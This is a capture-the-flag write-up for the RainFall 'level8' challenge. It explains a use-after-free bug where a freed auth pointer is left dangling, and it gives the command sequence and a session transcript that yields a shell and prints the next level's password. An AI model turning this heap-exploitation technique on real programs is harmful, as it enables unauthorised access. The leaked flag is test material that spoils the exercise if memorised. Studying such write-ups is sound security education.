# level8

If we analyze the code, this is one of the easiest exercises. It teaches us why freeing memory and then clearing the pointer matters.

We have three commands: `auth [name]`, `service [content]`, and `reset`. 

The `auth` command performs a heap allocation:
- It allocates the `auth_t` structure.
- It then clears the memory to zero. This is good, but not sufficient.

However, we cannot input more than 32 characters, which we would need to overwrite the integer in the structure directly. We must find another way.

Let's look at what the `service` command does:
- It duplicates the string (excluding the "service " prefix) onto the heap.

The `reset` command frees the `auth` pointer. Here is the key issue: the `reset` command frees the `auth` pointer but does not set the `auth` variable to `NULL`. Even though the chunk is freed, the global pointer still points to the same memory location.

Let's exploit this behavior to bypass the login check:

1. Execute `auth ` to allocate the `auth_t` structure on the heap.
2. Execute `reset` to free the `auth` structure, marking the heap chunk as reusable.
3. Execute `service` with a string long enough to overwrite the `authenticated` member. The heap allocator will reuse the recently freed `auth` chunk for the new `service` string.
4. Execute `login`. Since the `auth` pointer is still pointing to the same memory block and the `authenticated` offset (offset 32) is now populated with our non-zero `service` characters, the program spawns a shell.

Here is the session demonstration:
```text
level8@RainFall:~$ ./level8 
(nil), (nil) 
auth 
0x804a008, (nil) 
reset
0x804a008, (nil) 
service AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAa
0x804a008, 0x804a018 
0x804a008, 0x804a018 
login
$ whoami
level9
$ cat /home/user/level9/.pass
c542e581c5ba5162a85f767996e3247ed619ef6c6f7b76a59435545dc6259f8a
```
